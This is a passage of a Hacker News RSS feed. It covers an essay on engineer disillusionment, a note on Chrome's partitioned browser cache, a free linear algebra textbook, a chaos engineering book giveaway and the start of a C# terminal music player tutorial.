nose, and mouth! It is the people who are outside of the monastery who feel its atmosphere. Those who are practicing actually do not feel anything. I think this is true for everything.</p></blockquote><p>I still remember the feeling when I first glanced inside the monastery. My parents bought me a ZX Spectrum computer connected to an old Soviet TV and cassette player, a few bootleg games, and a Z80 assembly manual printed on a dot matrix printer that was out of ink; about one tenth of the text was unreadable. I spent countless hours playing games, learning BASIC and Z80 assembly, and deciphering the missing parts of the manual. I don't remember much else from that time. That little machine was a window into a different world— limitless, safe, and totally engaging. At the time, nothing else mattered.</p><p><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F0cece565-e603-408e-bf0b-929ca8460009_1511x1046.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F0cece565-e603-408e-bf0b-929ca8460009_1511x1046.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/0cece565-e603-408e-bf0b-929ca8460009_1511x1046.jpeg&quot;,&quot;height&quot;:1008,&quot;width&quot;:1456,&quot;resizeWidth&quot;:656,&quot;bytes&quot;:206242,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></p><p>My next computer was an IBM machine with an i386 processor, 2MB of RAM (the ZX Spectrum had 16KB), a 30MB hard disk, and a five inch floppy drive. I could load programs in seconds instead of minutes. I could run Dune 2 and Wolfenstein 3D and hex editors and Prince of Persia and MS DOS and Borland Turbo Pascal and Civilization and a C compiler and Windows 3.1. I could save stuff! I remember studying Win16 APIs and feeling like I made contact with an advanced alien civilization. As I type this now, I still have sense memory of that machine. The rubbery smell, the buzzing sound of the CRT monitor, the springy feel of the keyboard (with proper arrow keys and all sorts of extra buttons!)</p><p>Then my friend's parents bought him an i486 machine with 4MB of RAM. It could run Doom. Everything changed again. You didn't even need to play to know that computer history was just delineated into before and after. As soon as you saw the artwork of the game menu, you knew. Doom changed me in a profound way. I used to never think about computers or programming. It was just something I loved to do more than anything else. But a few seconds of Doom gameplay permanently flipped a bit in my brain. It made me aware that programming computers is what I want to be doing for the rest of my life.</p><p>After that came the internet, and with it a whirlwind of new worlds. Some were brand new. Others were old, but the internet gave me the opportunity to access them for the first time. Windows 95, newsgroups, geocities, ICQ, Visual Studio, Diablo, Starcraft, 3Dfx Voodoo Banshee, Gamedev.net, IRC, Slashdot, DirectX, Windows NT, Java, OpenGL, NewEgg, Winamp, Napster, Deus Ex, World of Warcraft, Linux, Emacs, GPL, Google, Common Lisp, Standard ML, Smalltalk, the iPhone, Oculus Rift. Each had its own unique atmosphere. Each was a window into a different universe. Each one felt limitless. Safe. Engaging.</p><p>Everything, from the first ZX Spectrum to Oculus Rift was punctuated by countless books of science fiction. My dad introduced me to the genre with Jules Verne's The Mysterious Island, in which a team of five end up on an uninhabited island, and use their knowledge and ingenuity to rebuild a technological civilization from scratch. I remember reading this novel over and over, completely enthralled. I tried some of the experiments, with intermittent success.</p><p>My parents had a few shelves stacked with books, and I spent countless nights losing myself in them. I read everything by Jules Verne I could get my hands on, including From the Earth to the Moon, Twenty Thousand Leagues Under the Sea, Around the World in Eighty Days, and Journey to the Center of the Earth. After Verne I moved on to Ray Bradbury (The Veldt), Arkadiy and Boris Strugatsky (Prisoners of Power), Stanislaw Lem (the fantastical Summa Technologiae). I also read every story we had by Jack London— I couldn't imagine anything more exciting than the combination of science fiction and the romance of the American frontier. Today, nearly thirty years later, I still can't.</p><p>After we moved to America I learned that there is an enormous universe of science fiction that I missed as a child. I started filling the gaps and read stories and novels by Isaac Asimov, Arthur Clarke, William Gibson, Neal Stephenson, Ian Banks, Philip Dick, Cory Doctorow, Charlie Stross, Dan Simmons, Jack Vance, and Vernor Vinge. I also continued reading Russian science fiction. I read everything by Strugatsky brothers, and binge-read the pulpy Russian spin on the cyberpunk genre by Sergei Lukyanenko.</p><p>As I grew older I shifted to reading about megaprojects and the intersection of technology and commerce. I read about railroads, electrification, aviation, radio, television, silicon, and the stories of Bell Labs, Microsoft, The Manhattan Project, and The Apollo program. How the heck did we invent all this stuff, wire the planet, speed up transportation by two orders of magnitude, go to space, put a computer on every desk, and then, as if it weren't enough, put a supercomputer in every pocket?! How did we do all <em>that</em>?!</p><p>Sometimes I imagine what would happen if I could send my ten year old self a letter and tell him I could press a button and read <a href="https://amzn.to/2TrADJK">Masters of Doom</a> the next day, instantly send a short message to John Carmack from <em>anywhere</em> using an always connected supercomputer in my pocket, or that I worked for a company that published <a href="https://amzn.to/2HsSXQm">The Making of Prince of Persia</a>. He would have been over the moon!</p><p>But sitting at a mandated retrospective or mindlessly gluing APIs together doesn't put me over the moon. It makes me feel the opposite (whatever the opposite of being over the moon is). And so, engineers are faced with two realities. One reality is the atmosphere of new technology, its incredible power to transform the human condition, the joy of the art of doing science and engineering, the trials of the creative process, the romance of the frontier. The other reality is the frustration and drudgery of operating in a world of corporate politics, bureaucracy, envy and greed— a world <em>so</em> depressing, that many people quit in frustration, never to come back.</p><p>If you work in technology, the monastery can be distant and vague, whereas Paul from marketing wants to circle back with you here and now. Then, as you circle back again and again, the monastery recedes further into the distance, and the drudgery appears closer and closer, until it occupies your entire field of vision and you can't see anything else.</p><p>I have friends in the medical field, and they vent about drudgery and endless bureaucracy <em>all the time</em>. They have more roadblocks than we do, and theirs are objectively worse than ours. The hours are longer, the bureaucracy is more entrenched, the regulators mandate their time be wasted on bullshit, and mistakes can have devastating consequences. Yet I haven't heard of a single doctor who quit his practice and moved to Colorado to run a ski lodge. When I ask why, they all give the same response: the patients. Every day they see patients brought back to health, the bullshit recedes into the background, and they're reminded why they got into medicine.</p><p>The default in engineering is different. We don't have a daily ritual built into our jobs that reminds us why we got into the field. Without a ritual, the drudgery creeps closer and the vision of the monastery recedes. So we must be very deliberate in developing rituals to keep the two realities in their proper proportion.</p><p>I think the reason many engineers have trouble with this is that so much of our field is about knowledge, but rituals aren't about knowledge at all— they're about practice. You must develop a daily mantra, a spell, a routine, whatever you want to call it, and then perform it religiously. I needed a lot of trial and error to get it right, and I’m still playing with the details. The internet desensitized me to text and video. Anything that happens in front of a screen doesn't help with perspective anymore. But I discovered that getting away from the screen and handling physical items does.</p><p>I don't know what will work for you, but here are a few ideas. Read used hard cover …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.spakhm.com/p/surviving-disillusionment">https://www.spakhm.com/p/surviving-disillusionment</a></em></p>]]>
            </description>
            <link>https://www.spakhm.com/p/surviving-disillusionment</link>
            <guid isPermaLink="false">hacker-news-small-sites-24896650</guid>
            <pubDate>Mon, 26 Oct 2020 14:42:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Say goodbye to resource-caching across sites and domains]]>
            </title>
            <description>
<![CDATA[
Score 74 | Comments 79 (<a href="https://news.ycombinator.com/item?id=24894135">thread link</a>) | @stefanjudis
<br/>
October 26, 2020 | https://www.stefanjudis.com/notes/say-goodbye-to-resource-caching-across-sites-and-domains/ | <a href="https://web.archive.org/web/*/https://www.stefanjudis.com/notes/say-goodbye-to-resource-caching-across-sites-and-domains/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>When I started doing web development, we all loaded jQuery from the official global jQuery CDN.</p><p>The idea was straightforward: if everybody loads the same jQuery script file (<code>cdn.jquery.com/jquery.latest.js</code> – or whatever URL it was back then), then the script file would be cached by the browsers, and other sites requesting the same script would benefit from the speedup of already cached resources. Users would have popular libraries like jQuery already sitting in their browser cache because earlier visited sites requested them.</p><p>This caching behavior was possible because, at the time, the browser's HTTP caches used the asset URL (<code>cdn.jquery.com/jquery.latest.js</code>) as a single cache key. Browsers use cache keys to figure out if and how to cache a resource. If these keys only consist of the resource URL, it allows the reuse of resources across sites and domains.</p><p>All this worked great, but as it is with many great inventions in web technology, <strong>cross-site resource caching enabled new ways to track users across different sites</strong>.</p><p>As an example, let's assume Facebook loads a unique file in their logged-in area (<code>fb-logo-ajgdmaks839–as.svg</code> – I totally made that file path up); if I would know the file path to such a file, request it on <code>stefanjudis.com</code> and see a rapid response coming from the browser cache, I can almost be sure that the user has logged into Facebook lately.</p><h2 id="new-http-cache-keys-in-google-chrome"><a href="#new-http-cache-keys-in-google-chrome">#</a> New HTTP cache keys in Google Chrome</h2><p><a href="https://bugs.webkit.org/show_bug.cgi?id=110269">Webkit (Safari) changed its caching strategy already in 2013</a> to prevent user tracking via the browser cache. Its cache keys are a combination of the requested resource URL and the top-level-domain requesting the resource.</p><p><em>☝️ Big thanks to <a href="https://twitter.com/tomayac/status/1317861511784792067?s=20">Thomas Steiner who gave input on that matter</a>.</em></p><p>On the bright side, this key structure prevents the mentioned tracking possibilities; unfortunately, it also leads to duplicated resources in the browser cache.</p><p>And... it hinders third-party resource sharing across the internet.</p><pre><code>Browsers duplicate resources with different keys:

cdn.jquery.com/jquery.latest.js-amazon.co.uk
cdn.jquery.com/jquery.latest.js-www.stefanjudis.com
</code></pre><p>Starting with v86, Chrome will be using combined cache keys, too. This change means that it's time to say goodbye to third-party resource-sharing across the web. <a href="https://www.statista.com/statistics/544400/market-share-of-internet-browsers-desktop/">With Chrome's market share of roughly 70%</a>, most browsers hitting our sites will use partitioned browser caches from now on. Chrome went for combining the top-level site URL, the current frame site URL, and the resource URL. This approach is more granular than what Safari does, but the result is the same.</p><p>If your sites request the global jQuery, modules from <a href="https://unpkg.com/">unpkg.com</a>, font files from <a href="https://fonts.google.com/">Google fonts</a> or GA's (Google Analytics) <code>analytics.js</code>, <strong>users will redownload the resources no matter if they downloaded and cached them for other sites already.</strong></p><p>What does this change mean for you? If your sites live on modern hosting that provides a CDN and supports HTTP/2, you can drop the third-parties and should ship all resources yourself. Relying on a third-party provides little value in 2020.</p><p>I have mixed feelings about these changes. It's excellent that browsers consider privacy, but it looks like anything can be misused for tracking purposes these days. I wonder where we're going with this... 😢</p><p>If you're interested in learning more on this topic you can give <a href="https://shkspr.mobi/blog/2020/10/please-stop-using-cdns-for-external-javascript-libraries/">Terence Eden's post "Please stop using CDNs for external Javascript libraries"</a> or <a href="https://andydavies.me/blog/2018/09/06/safari-caching-and-3rd-party-resources/">Andy Davies' post "Safari, Caching and Third-Party Resources"</a> a read, too.</p><p>And hey, this post was trending on Hacker News. 🎉 If you're interested, <a href="https://news.ycombinator.com/item?id=24894135">here are the Hacker News comments</a>.</p></div></div>]]>
            </description>
            <link>https://www.stefanjudis.com/notes/say-goodbye-to-resource-caching-across-sites-and-domains/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24894135</guid>
            <pubDate>Mon, 26 Oct 2020 09:07:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Build your own isometric city]]>
            </title>
            <description>
<![CDATA[
Score 120 | Comments 40 (<a href="https://news.ycombinator.com/item?id=24892956">thread link</a>) | @atum47
<br/>
October 25, 2020 | https://victorribeiro.com/tileEditor/?example=01 | <a href="https://web.archive.org/web/*/https://victorribeiro.com/tileEditor/?example=01">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://victorribeiro.com/tileEditor/?example=01</link>
            <guid isPermaLink="false">hacker-news-small-sites-24892956</guid>
            <pubDate>Mon, 26 Oct 2020 04:58:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Free Linear Algebra textbook]]>
            </title>
            <description>
<![CDATA[
Score 348 | Comments 74 (<a href="https://news.ycombinator.com/item?id=24892907">thread link</a>) | @swatson741
<br/>
October 25, 2020 | https://hefferon.net/linearalgebra/ | <a href="https://web.archive.org/web/*/https://hefferon.net/linearalgebra/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
      <div id="innercontent">
	<p><img id="cover" src="https://hefferon.net/linearalgebra/cover.png" alt="cover of Linear Algebra by Hefferon"></p><p>
	  <a href="http://joshua.smcvt.edu/linearalgebra/book.pdf"><i>Linear Algebra</i></a> by Jim Hefferon,
	  along with its 
	  <a href="http://joshua.smcvt.edu/linearalgebra/jhanswer.pdf">answers to exercises</a>, 
	  is a text for a first undergraduate course.
	  It is Free.
	  Use it as the main book, as a supplement, or for independent study.
	</p>

	<h3>
	  Highlights
	</h3>
	
	<ul>
	  <li><span>Standard coverage</span>
            Linear systems and Gauss's method, 
	    vector spaces, linear maps and matrices, determinants,
	    and eigenvectors and eigenvalues.
          </li>
	  
	  <li><span>Developmental approach</span>
	    The book proves all of the results
	    but does not start by assuming that 
	    students are already able at abstract work.
	    Instead, it proceeds with a great deal of
	    motivation, many computational examples, 
            and many exercises.
	    The goal is to raise 
            each student's level of 
	    mathematical maturity.
          </li>
	  
	  <li><span>Extensive exercise sets</span>   
            Each subsection has a wide range of exercises,
            from 
	    routine verifications to a few challenges.
	    The
	    <a href="http://joshua.smcvt.edu/linearalgebra/jhanswer.pdf">solution book</a>
	    has each answer completely worked.
	    In addition, clicking on a problem 
	    takes you to its answer
	    while clicking on the answer takes you back to the problem.
          </li>
	  
	  <li><span>Popular</span>
	    Used in hundreds of classes at many schools, 
            as well as by thousands of people
            for independent study.
          </li>
	  
	  <li><span>Applications</span>
            Each chapter finishes with four or five short  
	    supplemental topics
            for reading or projects, or for
            small group work. 
          </li> 
	  
	  <li><span>Extras</span>
            There are <a href="https://hefferon.net/linearalgebra/teaching.html">beamer slides</a>
	    for classroom presentations, 
            a
	    <a href="https://hefferon.net/linearalgebra/teaching.html">lab manual</a> using
	    <a href="https://www.sagemath.org/"><i>Sage</i></a>,
	    and <a href="https://www.youtube.com/playlist?list=PLwF3A0R8OzMoMlE1-SaEh8h9VqUlO-r52">videos</a>.
          </li> 
	  
	  <li><span>Prerequisite</span>
            One semester of calculus.
          </li>
	  
	  <li><span>Free</span>
            Everything is 
	    <a href="https://hefferon.net/source.html">Freely available</a>,
	    including the
	    <a href="https://gitlab.com/jim.hefferon/linear-algebra"><span>L<sup>a</sup>T<sub>e</sub>X</span> source</a>.
	    You can also buy a
	    <a href="https://hefferon.net/linearalgebra/hardcopy.html">paper copy of the book</a>.
          </li>
	  
	  <li><span>Reviews</span>
            Some from:
            <a href="http://mathdl.maa.org/mathDL/19/?pa=reviews&amp;sa=viewBook&amp;bookId=72055">the Mathematical Association of America</a>,
            <a href="https://open.umn.edu/opentextbooks/textbooks/24">the American Institute of Mathematics</a>,
            <a href="https://open.umn.edu/opentextbooks/BookDetail.aspx?bookId=24">the Open Textbook Library</a>,
            <a href="http://www.theassayer.org/cgi-bin/asbook.cgi?book=29"><i>The Assayer</i>, a longstanding site about free texts</a>.
          </li>
	  
	  <li><span>Award winning</span>
            Recipient of the 2020 Solow Award
	    from the Mathematical Association of America, for
	    “impact on undergraduate education in mathematics.”
          </li>
	</ul>
      </div>
    </div></div>]]>
            </description>
            <link>https://hefferon.net/linearalgebra/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24892907</guid>
            <pubDate>Mon, 26 Oct 2020 04:46:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Chaos Engineering Book]]>
            </title>
            <description>
<![CDATA[
Score 234 | Comments 30 (<a href="https://news.ycombinator.com/item?id=24892874">thread link</a>) | @talonx
<br/>
October 25, 2020 | https://www.verica.io/the-chaos-engineering-book/ | <a href="https://web.archive.org/web/*/https://www.verica.io/the-chaos-engineering-book/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					
					
					<div>
						<p>
							By Casey Rosenthal | October 6, 2020						</p>
						
						<p><span>12 minute read </span></p>
					</div>
										<p><img width="1000" height="600" src="https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2.jpg" alt="" loading="lazy" srcset="https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2.jpg 1000w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-300x180.jpg 300w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-768x461.jpg 768w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-50x30.jpg 50w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-400x240.jpg 400w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-600x360.jpg 600w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-660x396.jpg 660w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-800x480.jpg 800w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-960x576.jpg 960w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-327x196.jpg 327w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-654x392.jpg 654w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-260x156.jpg 260w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-520x312.jpg 520w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-417x250.jpg 417w, https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/ChaosEng-Book-flat-1000x600-2-778x467.jpg 778w" sizes="(max-width: 1000px) 100vw, 1000px">						<span></span>
					</p>
					
<p>I was hired at Netflix to lead the Traffic Team in early 2015. A few weeks later I was also asked to charter a Chaos Engineering Team. At the time, Chaos Engineering was essentially a program called Chaos Monkey with a few supporting blog posts. I wanted to get a feel for what our engineers thought about the practice, so I asked around: “What is Chaos Engineering?” The response I usually heard was, “Oh, that’s when we break stuff in production.”</p>



<p>As cool as that sounds, I could break stuff in production all day long and not provide any value to Netflix. I wanted to keep my job, not cause pointless havoc. So instead, I sat down with my team and defined Chaos Engineering as a proactive discipline to improve availability. We borrowed heavily from the field of Resilience Engineering and other research outside of the software industry to frame a practice of experimentation that follows in the best traditions of western science. Our definition is still published at <a href="http://principlesofchaos.org/" target="_blank" rel="noreferrer noopener">http://principlesofchaos.org/</a>. The point of Chaos Engineering isn’t to create chaos; it’s to chart a path of confidence through the chaos.</p>



<p>Working at Netflix was a highlight of my journey with Chaos Engineering. Another is co-authoring and publishing “Chaos Engineering: System Resiliency in Practice” with Nora Jones (Jeli.io). And now I am thrilled to have the opportunity to give away free e-copies of my book.</p>



<h2>Why Chaos Engineering is So Important Now</h2>



<p>Remote communication is literally saving lives during the pandemic. Never before have so many people relied on digital infrastructure to perform even basic tasks like getting food. The massive migration to remote work and remote education has irrevocably changed the course of societal structures, norms, and communication.</p>



<p>Work and school for hundreds of millions of people moved online in a matter of weeks. This is a monumental change to the most complex sociotechnical system we will ever be a part of. We don’t have access to a control group in this experiment. We only have one shot to get this right. The stakes are high.</p>



<p>With high stakes comes the opportunity for high value. The safety and reliability of the digital systems that we are suddenly so dependent on has never been more obvious. We have the opportunity and the responsibility to innovate in the areas of availability and security, to make these systems better in ways that matter to people.</p>



<p>The old methods won’t cut it. They aren’t bad, but they aren’t sufficient. Incident response management, alerting, metrics/logging, disaster recovery—all great, but also all reactive. They focus on time-to-detect and time-to-remediate. We need proactive methods. TDD, pair programming, peer code reviews, syntax scanning, QA—also great, but they won’t move the needle on availability or security in a complex system. You can’t expect a human to provide safety guarantees on something (a complex distributed system) that by definition is beyond the capability of a human to mentally model.</p>



<p>Chaos Engineering is a proactive approach to improving the safety properties of complex systems. We have an imperative to lean into these new, innovative approaches to help us cope with the increasing complexity and stress that our organizations are in. If you feel like your organization is facing unprecedented demands and requirements from a reliability perspective, you are in good company: most of us operating systems at scale are in that same position. With Chaos Engineering, you have an opportunity to meet those demands and navigate that complexity.</p>



<h2><strong>In the Book</strong></h2>



<p>This book explains where Chaos Engineering came from and provides some mental models to challenge the current mainstream thinking on system reliability. We then provide chapters contributed by authors from Slack, Google, Microsoft, LinkedIn, and CapitalOne, so that you can hear in their own words how people responsible for critical systems at scale are embracing Chaos Engineering to meet the challenges of the day. We also explore a bit outside of the typical boundaries of distributed software engineering to take a look at the future of the practice as well as its impact in manufacturing, autonomous vehicles, human systems, cyber security, and Continuous Verification.</p>



<h2><strong>We Want You to Have the Book… for Free</strong></h2>



<p>Nora and I wrote the most comprehensive, practical guide to Chaos Engineering. We even dedicated an entire chapter to establishing ROI so that you can see how Chaos Engineering has a positive effect. </p>



<p>Now Verica is sponsoring this book so that we can send you a digital copy for free. As a company, we believe the concepts explored within have the potential to completely change for the better how people build, operate, and maintain systems at scale. To get your free copy, go to <a href="https://www.verica.io/book/">verica.io/book</a>.</p>



<hr>



<div><figure><a href="https://www.verica.io/book/"><img src="https://vericadev.wpengine.com/wp-content/uploads/Button-for-Blogs-1024x614.jpg" alt=""></a></figure><div>
<p><strong>From us, to you</strong></p>



<p>If you liked this article, we think you’d love the official book on Chaos Engineering “Chaos Engineering, System Resiliency in Practice” by Casey Rosenthal and Nora Jones.</p>



<p><span><a href="https://www.verica.io/book/">GET YOUR FREE COPY</a></span></p>
</div></div>
					<!-- <div class="importent-content">
						<div class="half-content">
							<p>
								“A new practice is emerging that builds on the advantages established by CI/CD.
								Continuous Verification (CV) often manifests as a stage in a pipeline, but it can
								also run independently during business hours, verifying assumptions about the
								behavior of a system. Much like Chaos Engineering, CV platforms can include
								Availability or Security components and often express these as hypotheses. Like
								CI/CD, the practice is born out of a need to navigate increasingly complex systems.
								Organizations do not have the time or other resources to validate that the internal
								machinations of the system work as intended, so instead they verify that the output
								of the system is inline with expectations. This is the preference for verification
								over validation that hallmarks successful management of complex systems.”
							</p>
						</div>
						<p>
							There are many properties of a complex system that cannot be designed in the traditional
							sense, but that a business still needs to optimize. Take availability as an example.
							There are many approaches to improving availability. Some examples include: Incident
							Management, Alerting, Service Degradation, Observability Instrumentation, Disaster
							Recovery, Postmortem Facilitation, etc. What all of these approaches have in common is
							that they are aimed at improving time to detection (TTD) and time to remediation (TTR)
							of an incident. They are all reactive.
						</p>
						<p>
							When we sat down to define Chaos Engineering, we set out to build a discipline that was
							proactive. Chaos Engineering draws from the rich history of empirical experimentation to
							proactively discover vulnerabilities in complex systems. The culmination of this was the
							Chaos Automation Platform (ChAP) built by my team at Netflix.
						</p>
					</div> -->

				</div></div>]]>
            </description>
            <link>https://www.verica.io/the-chaos-engineering-book/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24892874</guid>
            <pubDate>Mon, 26 Oct 2020 04:38:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Developing a CLI Music Player in C# using Terminal.Gui]]>
            </title>
            <description>
<![CDATA[
Score 137 | Comments 33 (<a href="https://news.ycombinator.com/item?id=24892637">thread link</a>) | @sanesmith
<br/>
October 25, 2020 | https://markjames.dev/2020-10-25-developing-a-cli-music-player-csharp/ | <a href="https://web.archive.org/web/*/https://markjames.dev/2020-10-25-developing-a-cli-music-player-csharp/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article role="main">
        <p>Recently, I’ve been listening to a lot of <a href="https://somafm.com/" target="_blank">SomaFM</a> internet radio streams while I work as they have a lot of terrific commercial-free programming. One day while being creatively inspired by the Sonic Universe station’s offerings, I had the idea of creating my own music player with support for streaming. Not only would this be a great project for continuing to learn C# and Dotnet Core, but it would also allow me to build a simple, lightweight player customized to my liking! After a brainstorming session, I came up with the name MusicSharp and a core list of features I planned to implement:</p>

<ul>
  <li>Play audio files and streams</li>
  <li>Save and load playlists</li>
  <li>Be lightweight</li>
  <li>Be CLI-based</li>
</ul>

<p>Moreover, I also wanted to make sure that I made use of Test Driven Development and code linting within the project. For this project, I’m making use of Stylecop to enfore proper code style. For the curious, you can view the entire MusicSharp code repository in its current state <a href="https://github.com/markjamesm/MusicSharp" target="_blank">on Github</a>. I highly recommend following the repo to keep up to date with the latest commits (and a star wouldn’t be too bad either :-P)!</p>

<h2 id="getting-started">Getting Started</h2>

<p>Armed with a name and an idea, the next thing I needed was to settle on was which C# libraries I would use to implement the UI and audio functionality. After doing some research, I decided that the optimal solution would be to use <a href="https://github.com/migueldeicaza/gui.cs" target="_blank">Terminal.Gui</a> for the UI elements and <a href="https://github.com/naudio/NAudio" target="_blank">NAudio</a> to handle the audio side of things. Created by Miuel de Icaza (the creator of Mono and Xamarin), Terminal.Gui is a cross-platform library for building console-based applications that work on monochrome terminals as well as modern terminals with mouse support. Leveraging Termnial.Gui to build the UI, I chose NAudio to handle the audio playing capabilities of MusicSharp as its a mature C# library.</p>

<h2 id="mocking-up-a-simple-ui">Mocking up a simple UI</h2>

<p>With some of the preliminary items out of the way, my next step was to work on some wireframe mockups to see what kind of UI I might want to create. I’ve used a lot of music players over my life (including CLI ones), and so I have a good idea of what music players should have. Slowly, I started breaking down the different elements I thought would need and came up with the following:</p>

<ul>
  <li>A menu bar</li>
  <li>A status bar</li>
  <li>A player section (with associated controls)</li>
  <li>A playlist browser</li>
</ul>

<p>I sketched out a few different UI layouts until I came up with the following which I felt would work for a first iteration:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-ui-mockup.png" width="366" height="302" alt="MusicSharp UI mockup"></p>

<h2 id="building-the-main-window">Building the Main Window</h2>

<p>Mockup in hand, I started diving into the Terminal.gui API docs in order to build my first window. I created a new Gui class in a file called Gui.cs with a method named Start(). Inside the Start method, I initialized Terminal.Gui and created a simple top-level window. Note that</p>

<div><div><pre><code><span>namespace</span> <span>MusicSharp</span>
<span>{</span>
    <span>using</span> <span>Terminal.Gui</span><span>;</span>

    <span>/// &lt;summary&gt;</span>
    <span>/// The Gui class houses the CLI elements of MusicSharp.</span>
    <span>/// &lt;/summary&gt;</span>
    <span>public</span> <span>class</span> <span>Gui</span>
    <span>{</span>
        <span>/// &lt;summary&gt;</span>
        <span>/// The Start method builds the user interface.</span>
        <span>/// &lt;/summary&gt;</span>
        <span>public</span> <span>void</span> <span>Start</span><span>()</span>
        <span>{</span>
            <span>// Creates a instance of MainLoop to process input events, handle timers and other sources of data.</span>
            <span>Application</span><span>.</span><span>Init</span><span>();</span>

            <span>var</span> <span>top</span> <span>=</span> <span>Application</span><span>.</span><span>Top</span><span>;</span>
            <span>var</span> <span>tframe</span> <span>=</span> <span>top</span><span>.</span><span>Frame</span><span>;</span>

            <span>// Create the top-level window.</span>
            <span>var</span> <span>win</span> <span>=</span> <span>new</span> <span>Window</span><span>(</span><span>"MusicSharp"</span><span>)</span>
            <span>{</span>
                <span>X</span> <span>=</span> <span>0</span><span>,</span>
                <span>Y</span> <span>=</span> <span>1</span><span>,</span> <span>// Leave one row for the toplevel menu</span>

                <span>// By using Dim.Fill(), it will automatically resize without manual intervention</span>
                <span>Width</span> <span>=</span> <span>Dim</span><span>.</span><span>Fill</span><span>(),</span>

                <span>// Subtract one row for the statusbar</span>
                <span>Height</span> <span>=</span> <span>Dim</span><span>.</span><span>Fill</span><span>()</span> <span>-</span> <span>1</span><span>,</span>
            <span>};</span>
            <span>});</span>

            <span>// Add the layout elements and run the app.</span>
            <span>top</span><span>.</span><span>Add</span><span>(</span><span>win</span><span>);</span>
            <span>Application</span><span>.</span><span>Run</span><span>();</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Inside my Program.cs file, I called the Start method like so:</p>

<div><div><pre><code>    <span>public</span> <span>static</span> <span>void</span> <span>Main</span><span>()</span>
    <span>{</span>
        <span>// Start MusicSharp.</span>
        <span>Gui</span> <span>gui</span> <span>=</span> <span>new</span> <span>Gui</span><span>();</span>
        <span>gui</span><span>.</span><span>Start</span><span>();</span>
    <span>}</span>
</code></pre></div></div>

<p>Running the program in this state produced the following result:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-first-build.png" width="750" height="402" alt="MusicSharp first build screenshot"></p>

<p>Success! We now have a top level window which dynamically resizes while leaving space on the top and bottom of the screen for statusbars.</p>



<p>The next step was to implement a top level menu, and fortunately this was easy to do with Terminal.Gui. Just aboce top.Add(win), I created the following code:</p>

<div><div><pre><code><span>// Create the menubar.</span>
<span>var</span> <span>menu</span> <span>=</span> <span>new</span> <span>MenuBar</span><span>(</span><span>new</span> <span>MenuBarItem</span><span>[]</span>
<span>{</span>
    <span>new</span> <span>MenuBarItem</span><span>(</span><span>"_File"</span><span>,</span> <span>new</span> <span>MenuItem</span><span>[]</span>
    <span>{</span>
        <span>new</span> <span>MenuItem</span><span>(</span><span>"_Open"</span><span>,</span> <span>"Open a music file"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Application</span><span>.</span><span>RequestStop</span><span>()),</span>

